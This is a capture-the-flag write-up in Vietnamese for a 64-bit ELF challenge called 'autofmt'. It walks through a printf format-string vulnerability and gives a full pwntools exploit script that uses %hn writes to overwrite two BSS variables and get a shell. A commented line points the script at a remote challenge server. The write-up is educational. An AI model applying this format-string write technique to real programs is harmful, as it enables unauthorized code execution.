# **Autofmt**

File: autofmt - ELF linux 64bit


## Phân tích 

### Kiểm tra các protection

![image](https://user-images.githubusercontent.com/31529599/147476355-fb3db6f7-f941-4532-8dda-00ddb86a4084.png)

Bật toàn bộ các protection

### Phân tích bằng IDA

Chương trình sẽ random ra 2 tham số và sẽ in ra màn hình giá trị hai tham số này và in ra địa chỉ biến `a` nằm trên BSS section 
Code hàm `main`:

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  __int64 ptr; // [rsp+8h] [rbp-E8h] BYREF
  __int64 v5; // [rsp+10h] [rbp-E0h] BYREF
  FILE *stream; // [rsp+18h] [rbp-D8h]
  char s[200]; // [rsp+20h] [rbp-D0h] BYREF
  unsigned __int64 v8; // [rsp+E8h] [rbp-8h]

  v8 = __readfsqword(0x28u);
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(_bss_start, 0LL, 2, 0LL);
  stream = fopen("/dev/urandom", "rb");
  fread(&ptr, 8uLL, 1uLL, stream);
  fread(&v5, 8uLL, 1uLL, stream);
  fclose(stream);
  puts("Use format string to overwrite 2 value of a and b");
  printf("a = %llu\nb = %llu\na address: %p\n", ptr, v5, &a);
  fgets(s, 200, stdin);
  printf(s);
  if ( a == ptr && b == v5 )
    system("/bin/sh");
  return 0;
}
```

## Khai thác

Bài này ta sử dụng lỗi format string để ghi đè 2 biến `a`, `b` nằm trên BSS sau đó thõa mãn điều kiện và gọi `system(/bin/sh)`

Bài này mình viết code manual để solve tuy nhiên bài này cũng có thể cũng có thể sài hàm tự động của pwntools module để giải 


### code python

Đây là một dang format string bình thường tuy nhiên nếu code manual thì chúng ta phải biết cách sắp xếp lại các địa chỉ ghi đè theo thứ tự tăng dần để đảm bảo buffer không bị overflow

Và ở đây mình ghi đè theo 2bytes nên sài format string là `%hn`

```python
from pwn import *


def padding(n):
    n = str(n)
    while len(n) != 5:
        n = '0' + n
    return n


def split_and_sort(a):
    arr = {}
    print(hex(a))
    for i in range(8):
        arr[i] = a & 0xffff
        a = a >> 16
    arr = dict(sorted(arr.items(), key=lambda item: item[1]))
    return arr


p = process('./autofmt')
# p = remote('45.122.249.68', '10015')

e = ELF('./autofmt')


r = p.recv().split(b'\n')
a = int(r[1].split(b' ')[2].decode(), 10)
b = int(r[2].split(b' ')[2].decode(), 10)
add_a = int(r[3].split(b' ')[2].decode()[2:], 16)
add_b = add_a-8

print('a = ', hex(a))
print('b = ', hex(b))
print('add a = ', hex(add_a))

arr_s = split_and_sort((a << 64) | b)  # split and sort asccending

print(arr_s)

payload = b''
prev = 0
offset = 23
count = 8

# build payload format string
for b2 in arr_s.values():
    temp = b2
    b2 = b2-prev
    if count == 8:
        payload += b'%'+str(b2).encode()+f'c%{offset}$hn'.encode()
    else:
        payload += b'%'+str(b2).encode()+f'c%{offset}$hn'.encode()

    prev = temp
    offset += 1
    count -= 1

print(len(payload))
while len(payload) % 8 != 0:
    payload += b'a'

for i in arr_s.keys():
    print(hex(add_a+2*i))
    payload += p64(add_b+2*i)


print(payload)

p.sendline(payload)
p.interactive()
```


## Chạy code khai thác

![image](https://user-images.githubusercontent.com/31529599/147479667-cf3b1969-d711-47e2-9bb2-14272a5daf02.png)

